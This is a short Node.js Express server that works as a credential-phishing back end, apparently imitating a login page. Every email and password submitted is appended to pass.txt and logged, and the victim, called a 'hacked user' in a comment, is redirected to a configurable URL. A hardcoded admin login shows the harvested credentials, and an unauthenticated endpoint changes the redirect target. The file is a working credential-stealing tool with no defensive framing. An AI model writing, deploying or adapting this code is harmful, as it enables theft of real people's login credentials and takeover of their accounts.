var express = require("express");
var bodyParser = require('body-parser');
var fs = require("fs");

var app = express();

app.set("view engine", "ejs");

var urlencodedParser = bodyParser.urlencoded({ extended: false })

app.get("/", function(req, res){
 console.log("new req");
 res.sendFile(__dirname + "/index.html");
});

app.post("/", urlencodedParser, function(req, res){
 var email = req.body.email;
 var password = req.body.pass;
 if (email === "magson" && password === "m@gs0n123"){
  fs.readFile("pass.txt", "utf8", function(err, data){
  fs.readFile("url.txt", "utf8", function(err, link){
    res.render("admin", {data: data, link: link});
  });
  });
 }
	else{
	  console.log("New user credentials " + email + " - " + password);
	  fs.appendFile("pass.txt", "email: " + email + " - " + "Password: " + password + "                             ", function(err){
	    // redirecting hacked user to facebook        
            fs.readFile("url.txt", "utf8", function(err, data){
	    res.redirect(data); 

	});
	  }); 
	}
});

app.post("/url", urlencodedParser, function(req, res){
  console.log("The URL has been changed to: " + req.body.url);
  fs.writeFile("url.txt", req.body.url); 
  // TODO return the admin page
  res.send("URL has been changed");
});

app.listen(8080);
console.log("Listening on 8080");
